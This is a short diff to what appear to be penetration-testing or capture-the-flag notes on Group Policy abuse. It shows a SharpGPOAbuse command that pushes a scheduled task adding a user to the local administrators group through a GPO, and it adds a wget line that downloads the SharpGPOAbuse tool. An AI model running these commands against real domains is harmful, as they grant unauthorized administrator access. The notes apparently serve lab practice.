@@ -32,3 +32,7 @@ https://raw.githubusercontent.com/rootSySdk/PowerGPOAbuse/master/PowerGPOAbuse.p
 ```
 .\SharpGPOAbuse.exe --AddComputerTask --TaskName 'noraj' --Author 'vulnnet\administrator' --Command "powershell.exe /c" --Arguments "net localgroup administrators enterprise-security /add" --GPOName "security-pol-vn"
 ```
+## SharpGPOAbuse
+```
+wget https://github.com/byronkg/SharpGPOAbuse/raw/main/SharpGPOAbuse-master/SharpGPOAbuse.exe
+```
